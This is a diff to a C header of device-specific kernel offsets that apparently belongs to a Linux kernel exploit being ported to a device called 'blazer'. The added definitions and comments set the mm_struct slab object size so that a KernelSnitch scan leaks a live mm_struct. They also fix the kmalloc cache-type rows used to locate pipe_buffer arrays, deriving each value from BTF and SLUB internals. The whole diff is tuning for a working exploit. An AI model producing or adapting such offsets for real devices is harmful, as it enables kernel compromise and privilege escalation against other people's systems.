@@ -271,6 +271,33 @@
 
 // DIVERGENCE: mm_struct->owner, 0x408 on blazer.
 #define MM_OWNER_OFF                  824
+
+// DIVERGENCE: overrides common.h's 0x500, which is the 6.6 value. This is the
+// SLUB object size of the mm_struct cache, and KernelSnitch strides the slab by
+// it — a wrong value means the scan never lands on a live mm_struct and the
+// leak fails on every retry.
+//   sizeof(struct mm_struct) = 960 (BTF)
+//   mm_cachep uses SLAB_HWCACHE_ALIGN, so the object is aligned up to
+//   cache_line_size(); the device reports LEVEL1_DCACHE_LINESIZE = 64 and 960
+//   is already a multiple of 64, so it stays 960.
+// MM_ORDER needs no override: SLUB's calculate_order for a 960-byte object on
+// 8 CPUs lands on order 3 (34 objects per slab, 128 bytes waste, well inside
+// the 1/16 threshold), which is what common.h already uses.
+#define MM_STRUCT_SZ                  0x3c0
+
+// DIVERGENCE: overrides common.h's 2 / 4, which are the 6.6 values. From this
+// build's BTF, enum kmalloc_cache_type is
+//   KMALLOC_NORMAL=0  KMALLOC_DMA=0  KMALLOC_CGROUP=1  KMALLOC_RECLAIM=2
+//   NR_KMALLOC_TYPES=3
+// KMALLOC_DMA collapses onto KMALLOC_NORMAL because CONFIG_ZONE_DMA is not set
+// in this build (only CONFIG_ZONE_DMA32), which pulls CGROUP down to row 1.
+// pipe_buffer arrays are allocated with GFP_KERNEL_ACCOUNT and so live in the
+// CGROUP row; reading row 2 here would hand back the RECLAIM kmalloc-2048
+// cache instead, and pipe_cache_matches() would never match. The row count
+// matters too: KMALLOC_CACHE_SLOTS sizes the bulk read of kmalloc_caches, and
+// 4 rows would read 112 bytes past the end of a 3-row array.
+#define KMALLOC_CGROUP_TYPE           1
+#define KMALLOC_CACHE_TYPES           3
 #define PIPE_BUFFER_SIZE              0x28
 
 // ── struct page / struct slab (BTF) ─────────────────────────────────────
